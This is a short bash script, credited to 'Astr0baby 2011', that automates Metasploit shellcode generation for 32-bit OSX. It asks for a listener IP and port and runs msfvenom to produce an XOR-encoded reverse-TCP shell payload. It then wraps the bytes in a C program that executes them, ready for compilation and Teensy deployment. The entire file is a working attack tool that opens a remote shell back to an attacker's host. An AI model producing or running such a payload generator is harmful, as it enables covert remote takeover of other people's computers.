clear  
echo "************************************************************"
echo "    Automatic  shellcode generator - FOR METASPLOIT         "
echo "                  By Astr0baby 2011                         "
echo "        TESTING FOR OSX 32bit tested on 10.6                "  
echo "    For Automatic Teensy programming and deployment         "
echo "************************************************************"
echo -e "What IP are we gonna use ?  \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
./msfvenom  -p  osx/x86/shell_reverse_tcp  LHOST=$IP LPORT=$port EXITFUNC=thread R  -e x86/call4_dword_xor  > test.c  
mv test.c ShellCode
cd ShellCode
#Replacing plus signs at the end of line
sed -e 's/+/ /g' test.c > clean.c
sed -e 's/buf = /unsigned char micro[]=/g' clean.c > ready.c
echo "#include <stdio.h>" >> temp.c 
cat ready.c >> temp.c 
echo ";" >> temp.c
echo "int main(void) { ((void (*)())micro)();" >> temp.c 
echo "}" >> temp.c  
mv temp.c final.c
echo "final.c is ready in ShellCode, please compile it usig gcc on OSX"
#Cleanup
rm -f clean.c
rm -f test.c
rm -f ready.c
rm -f rand.c
rm -f temp2
rm -f temp3
rm -f temp4 
cd ..
